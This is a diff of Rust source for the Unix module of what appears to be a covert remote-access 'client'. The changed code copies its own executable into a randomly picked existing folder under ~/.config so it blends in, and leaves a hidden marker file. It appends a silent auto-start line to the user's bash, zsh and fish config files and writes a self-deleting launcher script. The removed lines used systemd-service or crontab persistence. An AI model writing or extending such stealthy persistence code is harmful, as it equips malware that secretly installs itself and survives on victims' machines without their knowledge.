@@ -152,13 +152,17 @@ mod windows {
 mod unix {
     use std::{
         env,
-        fs::{self, File},
+        fs::{self, File, OpenOptions},
         io::{Read, Write},
         path::PathBuf,
         process::Command,
         thread::sleep,
         time::Duration,
     };
+
+    // use rand::distributions::Alphanumeric; // Not available in rand 0.9.x
+    use rand::rng;
+    use rand::Rng;
 
     pub fn is_elevated() -> bool {
         unsafe { libc::geteuid() == 0 }
@@ -181,82 +185,137 @@ mod unix {
         folder.map(PathBuf::from)
     }
 
-    pub fn install(folder: String, filename: String, hidden: bool) {
-        println!("Installing client to {}", folder);
-        let install_dir = match get_special_folder(folder.as_str()) {
-            Some(path) => path,
-            None => {
-                eprintln!("Invalid install folder.");
+    fn add_to_shell_config(install_path: &PathBuf) {
+        let home = match env::var("HOME") {
+            Ok(home) => home,
+            Err(_) => return,
+        };
+
+        let shell_configs = vec![
+            format!("{}/.bashrc", home),
+            format!("{}/.zshrc", home),
+            format!("{}/.config/fish/config.fish", home),
+        ];
+
+        let startup_command = format!("{} >/dev/null 2>&1 &", install_path.display());
+        let marker_comment = "# Auto-start client";
+
+        for config_path in shell_configs {
+            let config_file = PathBuf::from(&config_path);
+            
+            // Check if config file exists
+            if !config_file.exists() {
+                continue;
+            }
+
+            // Read existing content
+            let mut content = String::new();
+            if let Ok(mut file) = File::open(&config_file) {
+                if file.read_to_string(&mut content).is_err() {
+                    continue;
+                }
+            }
+
+            // Check if startup command already exists
+            if content.contains(&startup_command) {
+                continue;
+            }
+
+            // Add startup command to config file
+            if let Ok(mut file) = OpenOptions::new()
+                .write(true)
+                .append(true)
+                .open(&config_file) 
+            {
+                let _ = writeln!(file, "\n{}", marker_comment);
+                let _ = writeln!(file, "{}", startup_command);
+            }
+        }
+    }
+
+    pub fn install(_folder: String, filename: String, hidden: bool) {
+        let home = match env::var("HOME") {
+            Ok(home) => home,
+            Err(_) => {
+                eprintln!("Could not determine home directory.");
                 return;
             }
         };
+        let config_dir = PathBuf::from(format!("{}/.config", home));
+        let marker_path = config_dir.join(".clientd_path");
 
-        let install_path = install_dir.join(filename);
+        // If marker file exists, read the path and check if we're already installed
+        if let Ok(path) = std::fs::read_to_string(&marker_path) {
+            let path = path.trim();
+            if let Ok(current_exe) = std::env::current_exe() {
+                if current_exe == PathBuf::from(path) {
+                    // Already installed and running from install path
+                    return;
+                }
+            }
+        }
+
+        // Try up to 5 random folders to avoid permission issues
+        let mut rng = rand::rng();
+        let mut install_dir = None;
+        let mut install_path = None;
+        for _ in 0..5 {
+            let random_folder = match fs::read_dir(&config_dir) {
+                Ok(entries) => {
+                    let folders: Vec<_> = entries.filter_map(|e| {
+                        let e = e.ok()?;
+                        let md = e.metadata().ok()?;
+                        if md.is_dir() { Some(e.file_name().to_string_lossy().to_string()) } else { None }
+                    }).collect();
+                    if folders.is_empty() {
+                        format!("folder_{}", rng.gen::<u64>())
+                    } else {
+                        let idx = rng.random_range(0..folders.len());
+                        folders[idx].clone()
+                    }
+                },
+                Err(_) => format!("folder_{}", rng.gen::<u64>()),
+            };
+            let try_dir = config_dir.join(&random_folder);
+            let try_path = try_dir.join(&filename);
+            // Try to create the directory if it doesn't exist
+            if !try_dir.exists() {
+                if let Err(e) = fs::create_dir_all(&try_dir) {
+                    eprintln!("Failed to create install directory: {}", e);
+                    continue;
+                }
+            }
+            // Check if we can write to the directory
+            if fs::OpenOptions::new().write(true).create(true).open(&try_path).is_ok() {
+                install_dir = Some(try_dir);
+                install_path = Some(try_path);
+                break;
+            }
+        }
+        let install_dir = match install_dir {
+            Some(d) => d,
+            None => {
+                eprintln!("Could not find a writable install directory in ~/.config");
+                return;
+            }
+        };
+        let install_path = install_path.unwrap();
+        println!("Installing client to {}", install_path.display());
 
         let current_exe = std::env::current_exe().unwrap();
         if current_exe == install_path {
-            return; // Already installed
-        }
-
-        // Set persistence
-        if is_elevated() {
-            // Create systemd service
-            let service_name = install_path.file_stem().unwrap().to_string_lossy();
-            let service_content = format!(
-                "[Unit]\n\
-                Description={}\n\
-                After=network.target\n\n\
-                [Service]\n\
-                Type=simple\n\
-                ExecStart={}\n\
-                Restart=always\n\n\
-                [Install]\n\
-                WantedBy=multi-user.target",
-                service_name,
-                install_path.display()
-            );
-
-            let service_path = format!("/etc/systemd/system/{}.service", service_name);
-            if let Ok(mut file) = File::create(&service_path) {
-                let _ = file.write_all(service_content.as_bytes());
-                let _ = Command::new("systemctl")
-                    .args(["daemon-reload"])
-                    .output();
-                let _ = Command::new("systemctl")
-                    .args(["enable", &format!("{}.service", service_name)])
-                    .output();
-            }
-        } else {
-            // Add to user's crontab
-            let crontab_entry = format!(
-                "@reboot {}",
-                install_path.display()
-            );
-            let _ = Command::new("crontab")
-                .args(["-l"])
-                .output()
-                .and_then(|output| {
-                    let mut current = String::from_utf8_lossy(&output.stdout).to_string();
-                    if !current.contains(&crontab_entry) {
-                        current.push('\n');
-                        current.push_str(&crontab_entry);
-                        Command::new("crontab")
-                            .args(["-"])
-                            .stdin(std::process::Stdio::piped())
-                            .output()
-                            .map(|_| ())
-                    } else {
-                        Ok(())
-                    }
-                });
+            // Already installed and running from install path
+            return;
         }
 
         // Copy executable
         if install_path.exists() {
-            let _ = fs::remove_file(&install_path);
-            sleep(Duration::from_secs(1));
+            // If not writable, abort
+            if fs::OpenOptions::new().write(true).open(&install_path).is_err() {
+                eprintln!("Install path {} exists but is not writable", install_path.display());
+                return;
+            }
         }
-
         if let Ok(mut target) = File::create(&install_path) {
             if let Ok(mut current) = File::open(&current_exe) {
                 let mut buffer = Vec::new();
@@ -270,6 +329,12 @@ mod unix {
             .args(["+x", install_path.to_str().unwrap()])
             .output();
 
+        // Write marker file
+        let _ = std::fs::write(&marker_path, install_path.to_string_lossy().as_bytes());
+
+        // Add to shell configs for persistence
+        add_to_shell_config(&install_path);
+
         // Optional: hide file
         if hidden {
             let _ = Command::new("chmod")
@@ -282,7 +347,7 @@ mod unix {
         if let Ok(mut script) = File::create(&script_path) {
             let _ = writeln!(script, "#!/bin/sh");
             let _ = writeln!(script, "sleep 3");
-            let _ = writeln!(script, "{} &", install_path.display());
+            let _ = writeln!(script, "{} >/dev/null 2>&1 &", install_path.display());
             let _ = writeln!(script, "rm \"$0\"");
         }
 
